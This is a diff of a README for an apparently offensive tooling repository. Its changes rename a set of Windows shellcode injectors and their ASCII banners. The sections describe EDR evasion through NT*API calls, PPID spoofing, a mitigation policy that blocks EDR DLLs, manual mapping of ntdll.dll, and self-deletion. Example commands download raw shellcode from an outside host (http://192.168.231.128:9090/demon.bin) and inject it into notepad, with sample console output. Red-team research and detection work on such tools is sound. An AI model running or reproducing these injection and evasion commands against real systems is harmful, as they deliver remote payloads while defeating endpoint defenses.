@@ -196,8 +196,8 @@ Process Injector 1: Runner (Win32 API)
 [>] Runner.exe removed from disk!
 ```
 
-### Clicker
-Clicker is a Proof-of-Concept loader for code injection using NT\*API calls to defeat Kernel32 API Monitoring. All Win32 APIs are mapped to the respective NT level API as follows:
+### Stalker
+Stalker is a Proof-of-Concept loader for code injection using NT\*API calls to defeat Kernel32 API Monitoring. All Win32 APIs are mapped to the respective NT level API as follows:
 | Win32 API          | NT\*API                                                      |
 |--------------------|--------------------------------------------------------------|
 | VirtualAllocEx     | NtAllocateVirtualMemory |
@@ -205,31 +205,43 @@ Clicker is a Proof-of-Concept loader for code injection using NT\*API calls to d
 | VirtualProtectEx   | NtProtectVirtualMemory |
 | CreateRemoteThread | NtCreateThreadEx |
 ```
-C:\>Clicker.exe -u http://192.168.231.128:9090/demon.bin -t notepad -p 4160 -k
+C:\>Stalker.exe -u http://192.168.231.128:9090/demon.bin -t notepad -p 4160 -k
 
-       .:'                                  `:.
-      ::'                                    `::
-     :: :.                                  .: ::
-      `:. `:.             .             .:'  .:'
-       `::. `::           !           ::' .::'
-           `::.`::.    .' ! `.    .::'.::'
-             `:.  `::::'':!:``::::'   ::'
-             :'*:::.  .:' ! `:.  .:::*`:
-            :: HHH::.   ` ! '   .::HHH ::
-           ::: `H TH::.  `!'  .::HT H' :::
-           ::..  `THHH:`:   :':HHHT'  ..::
-           `::      `T: `. .' :T'      ::'
-             `:. .   :         :   . .:'
-               `::'               `::'
-                 :'  .`.  .  .'.  `:
-                 :' ::.       .:: `:
-                 :' `:::     :::' `:
-                  `.  ``     ''  .'
-                   :`...........':
-                   ` :`.     .': '
-                    `:  `"""'  :'   Clicker
+     j                       k
+    .K                       Z.
+    jM.                     .Mk
+    WMk                     jMW
+    YMM.       ,,,,,,      .MMY
+    `MML;:''```      ```':;JMM'
+    /`JMMMk.           .jMMMk'\
+    / `GMMMI'         `IMMMO' \
+   /    ~~~'           `~~~    \
+   /                           \
+   |                           |
+   |      ;,           ,;      |
+   |      Tk           jT      |
+    |     `Mk   . .   jM'     |
+    |      YK.   Y   .ZY      |
+     \     `Kk   |   jZ'     /
+     \       `'  |  `'       /
+      \          |          /
+       \         |         /
+       \         |         /
+        \        |        /
+         \       |       /
+         \       |       /
+          \      |      /
+           \     |     /
+           \  |  |  |  /
+            \ {| | |} /
+             \ ` | ' /
+              \  |  /
+              \  |  /
+               \   /
+                \ /
+                 ~   Stalker
                     
-Process Injector 2: Clicker (Nt*API)
+Process Injector 2: Stalker (Nt*API)
 
   -u, --url      Required. Remote URL address for raw shellcode.
 
@@ -276,23 +288,79 @@ Process Injector 2: Clicker (Nt*API)
 [>] CloseHandle()
     |-> Closing Thread Handle!
 
-[>] Clicker.exe removed from disk!
+[>] Stalker.exe removed from disk!
 ```
 
 ### SylantStrike
-Home-made Endpoint Detection & Response (EDR) to hook NT*API calls. The hooking logic is not implemented perfectly and has a high chance of false positive. Use only for demonstrating EDR bypass.
+Home-made Endpoint Detection & Response (EDR) to hook NT*API calls. The hooking logic is not implemented perfectly and has a high chance of false positive. Use only for demonstrating EDR bypass. (Credit to [@CCob](https://github.com/CCob/SylantStrike))
 ```
-PS C:\Users\havoc\Desktop\Tools\SylantStrike\x64\Release> .\SylantStrikeInject.exe --process=Clicker.exe --dll=C:\Users\havoc\Desktop\Tools\SylantStrike\x64\Release\SylantStrike.dll
+PS C:\Users\havoc\Desktop\Tools\SylantStrike\x64\Release> .\SylantStrikeInject.exe --process=Stalker.exe --dll=C:\Users\havoc\Desktop\Tools\SylantStrike\x64\Release\SylantStrike.dll
 Waiting for process events
-+ Listening for the following processes: clicker.exe
++ Listening for the following processes: stalker.exe
 
- Injecting process Clicker.exe(4312) with DLL C:\Users\havoc\Desktop\Tools\SylantStrike\x64\Release\SylantStrike.dll
+Injecting process Stalker.exe(4312) with DLL C:\Users\havoc\Desktop\Tools\SylantStrike\x64\Release\SylantStrike.dll
+```
+
+### Clicker
+Clicker is a wrapper used to side-load `Stalker` for demonstrating Process Mitigation Policy. This technique prevents security vendors from reflectively loading EDR DLLs that are not digitally signed by Microsoft. As a result, `kernel32.dll` and `ntdll.dll` of newly spawned processes will not be hooked by EDR vendors unless they have Intermediate Certificates handed out by Microsoft.
+```
+C:\>Clicker.exe -f ./Stalker.exe -p 4160 -u http://192.168.231.128:9090/demon.bin -t notepad -s 4160
+
+   .:'                                  `:.
+  ::'                                    `::
+ :: :.                                  .: ::
+  `:. `:.             .             .:'  .:'
+   `::. `::           !           ::' .::'
+       `::.`::.    .' ! `.    .::'.::'
+         `:.  `::::'':!:``::::'   ::'
+         :'*:::.  .:' ! `:.  .:::*`:
+        :: HHH::.   ` ! '   .::HHH ::
+       ::: `H TH::.  `!'  .::HT H' :::
+       ::..  `THHH:`:   :':HHHT'  ..::
+       `::      `T: `. .' :T'      ::'
+         `:. .   :         :   . .:'
+           `::'               `::'
+             :'  .`.  .  .'.  `:
+             :' ::.       .:: `:
+             :' `:::     :::' `:
+              `.  ``     ''  .'
+               :`...........':
+               ` :`.     .': '
+                `:  `"""'  :'   Clicker
+
+Process Injector 3 (Wrapper): Clicker (Process Mitigation Policy)
+
+  -f, --file       Required. Absolute path of file to be executed.
+
+  -p, --parent     Required. Spoof --file under a Parent Process ID.
+
+  -u, --url        Required. Remote URL address for raw shellcode.
+
+  -t, --target     Specify the target/victim process. Default: Self-injection
+
+  -s, --spoof      Spoof --target under a Parent Process ID.
+
+  -h, --help       Display help screen manual.
+  
+|--------------
+| File          : ./Stalker.exe
+| PPID Spoofing : 4160
+| Argument 1    : http://192.168.231.128:9090/demon.bin
+| Argument 2    : notepad
+| Argument 3    : 4160
+|--------------
+
+[>] CreateProcessW()
+    |-> Process Mitigation Policy Enforced!
+    |-> Spoofed Parent PID Successfully!
+    |-> Target Process Created!
+    |-> PID: 19520
 ```
 
 ### Bloater
-Bloater is a wrapper used to side-load `Clicker` for demonstrating Process Mitigation Policy. This technique prevents security vendors from reflectively loading EDR DLLs that are not digitally signed by Microsoft. As a result, `kernel32.dll` and `ntdll.dll` of newly spawned processes will not be hooked by EDR vendors unless they have Intermediate Certificates handed out by Microsoft.
+Bloater is the successor of `Stalker` as it uses the same boilerplate to perform process injection. At runtime, a fresh copy of `ntdll.dll` is loaded into the process. The original `ntdll.dll` that was hooked by EDR is left untouched. All NT*API are exported and called from the clean copy of `ntdll.dll` instead. This EDR evasion method is especially effective because the integrity of EDR hooks are not tampered with.
 ```
-C:\>Bloater.exe -f ./Clicker.exe -p 4160 -u http://192.168.231.128:9090/demon.bin -t notepad -s 4160
+C:\>Bloater.exe -u http://192.168.231.128:9090/demon.bin -t notepad -p 4160 -k
                                                                     _
                                                                   _( (~\
            _ _                        /                          ( \> > \
@@ -316,74 +384,7 @@ C:\>Bloater.exe -f ./Clicker.exe -p 4160 -u http://192.168.231.128:9090/demon.bi
           ;                            ;;+_  :::. :..;;;
                                        ;;;;;;,;;;;;;;;,;
 
-Process Injector 3 (Wrapper): Bloater (Process Mitigation Policy)
-
-  -f, --file       Required. Absolute path of file to be executed.
-
-  -p, --parent     Required. Spoof --file under a Parent Process ID.
-
-  -u, --url        Required. Remote URL address for raw shellcode.
-
-  -t, --target     Specify the target/victim process. Default: Self-injection
-
-  -s, --spoof      Spoof --target under a Parent Process ID.
-
-  -h, --help       Display help screen manual.
-  
-|--------------
-| File          : ./Clicker.exe
-| PPID Spoofing : 4160
-| Argument 1    : http://192.168.231.128:9090/demon.bin
-| Argument 2    : notepad
-| Argument 3    : 4160
-|--------------
-
-[>] CreateProcessW()
-    |-> Process Mitigation Policy Enforced!
-    |-> Spoofed Parent PID Successfully!
-    |-> Target Process Created!
-    |-> PID: 19520
-```
-
-### RatKing
-RatKing is the successor of `Clicker` as it uses the same boilerplate to perform process injection. At runtime, a fresh copy of `ntdll.dll` is loaded into the process. The original `ntdll.dll` that was hooked by EDR is left untouched. All NT*API are exported and called from the clean copy of `ntdll.dll` instead. This EDR evasion method is especially effective because the integrity of EDR hooks are not tampered with.
-```
-C:\>RatKing.exe -u http://192.168.231.128:9090/demon.bin -t notepad -p 4160 -k
-
-              .'''''-,              ,-`````.
-              `-.._  |              |  _..-'
-                 \    `,          ,'    /
-                 '=   ,/          \,   =`
-                 '=   (            )   =`
-                .\    /            \    /.
-               /  `,.'              `.,'  \
-               \   `.                ,'   /
-                \    \              /    /
-                 \   .`.  __.---. ,`.   /
-                  \.' .'``        `. `./
-                   \.'  -'''-..     `./
-                   /  /        '.      \
-                  /  / .--  .-'''`      '.
-                 '   |    ,---.    _      \
-     /``-----._.-.   \   / ,-. '-'   '.   .-._.-----``\
-     \__ .     | :    `.' ((O))   ,-.  \  : |     . __/
-      `.  '-...\_`     |   '-'   ((O)) |  '_/...-`  .'
- .----..)    `    \     \      /  '-'  / /    '    (..----.
-(o      `.  /      \     \    /\     .' /      \  .'      o)
- ```---..   `.     /`.    '--'  '---' .'\     .'   ..---```
-         `-.  `.  /`.  `.           .' .'\  .'  .-'
-            `..` /   `.'  ` - - - ' `.'   \ '..'
-                /    /                \    \
-               /   ,'                  `.   \
-               \  ,'`.                .'`.  /
-                `/    \              /    \'
-                 ,=   (              )   =,
-                 ,=   '\            /`   =,
-   RatKing       /    .'            `.    \
-              .-'''  |                |  ```-.
-              `......'                `......'
-
-Process Injector 4: RatKing (Manual Mapping ntdll.dll)
+Process Injector 4: Bloater (Manual Mapping ntdll.dll)
 
   -u, --url      Required. Remote URL address for raw shellcode.
 
@@ -434,37 +435,48 @@ Process Injector 4: RatKing (Manual Mapping ntdll.dll)
 [>] CloseHandle()
     |-> Closing Thread Handle!
 
-[>] RatKing.exe removed from disk!
+[>] Bloater.exe removed from disk!
 ```
 
-### RustKing
-RustKing is an adapted version of `RatKing` on steroids, written in Rust. The intention is to make Reverse Engineering significantly harder.
+### RatKing
+RatKing is an adapted version of `Bloater` on steroids, written in Rust. The intention is to make Reverse Engineering significantly harder.
 
-**NOTE:** RustKing does not support HTTPS payload download and PPID spoofing. Additionally, target process has to be opened manually prior to running RustKing. `--target` must be exact match.
+**NOTE:** RatKing does not support HTTPS payload download and PPID spoofing. Additionally, target process has to be opened manually prior to running RatKing. `--target` must be exact match.
 ```
-C:\>RustKing.exe --url http://192.168.231.128:9090/demon.bin --target notepad.exe
+C:\>RatKing.exe --url http://192.168.231.128:9090/demon.bin --target notepad.exe
 
-                    ..:::::::::..
-               ..:::aad8888888baa:::..
-            .::::d:?88888888888?::8b::::.
-          .:::d8888:?88888888??a888888b:::.
-        .:::d8888888a8888888aa8888888888b:::.
-       ::::dP::::::::88888888888::::::::Yb::::
-      ::::dP:::::::::Y888888888P:::::::::Yb::::
-     ::::d8:::::::::::Y8888888P:::::::::::8b::::
-    .::::88::::::::::::Y88888P::::::::::::88::::.
-    :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
-    :::::::Y88888888888P::|::Y88888888888P:::::::
-    ::::::::::::::::888:::|:::888::::::::::::::::
-    `:::::::::::::::8888888888888b::::::::::::::'
-     :::::::::::::::88888888888888::::::::::::::
-      :::::::::::::d88888888888888:::::::::::::
-       ::::::::::::88::88::88:::88::::::::::::
-        `::::::::::88::88::88:::88::::::::::'
-          `::::::::88::88::P::::88::::::::'
-            `::::::88::88:::::::88::::::'
-               ``:::::::::::::::::::''
-    OffensiveRust   ``:::::::::''    RustKing
+              .'''''-,              ,-`````.
+              `-.._  |              |  _..-'
+                 \    `,          ,'    /
+                 '=   ,/          \,   =`
+                 '=   (            )   =`
+                .\    /            \    /.
+               /  `,.'              `.,'  \
+               \   `.                ,'   /
+                \    \              /    /
+                 \   .`.  __.---. ,`.   /
+                  \.' .'``        `. `./
+                   \.'  -'''-..     `./
+                   /  /        '.      \
+                  /  / .--  .-'''`      '.
+                 '   |    ,---.    _      \
+     /``-----._.-.   \   / ,-. '-'   '.   .-._.-----``\
+     \__ .     | :    `.' ((O))   ,-.  \  : |     . __/
+      `.  '-...\_`     |   '-'   ((O)) |  '_/...-`  .'
+ .----..)    `    \     \      /  '-'  / /    '    (..----.
+(o      `.  /      \     \    /\     .' /      \  .'      o)
+ ```---..   `.     /`.    '--'  '---' .'\     .'   ..---```
+         `-.  `.  /`.  `.           .' .'\  .'  .-'
+            `..` /   `.'  ` - - - ' `.'   \ '..'
+                /    /                \    \
+               /   ,'                  `.   \
+               \  ,'`.                .'`.  /
+                `/    \              /    \'
+                 ,=   (              )   =,
+                 ,=   '\            /`   =,
+   RatKing       /    .'            `.    \
+              .-'''  |                |  ```-.
+              `......'                `......'
 
 [>] Scanning for notepad.exe...
     |-> Found process!
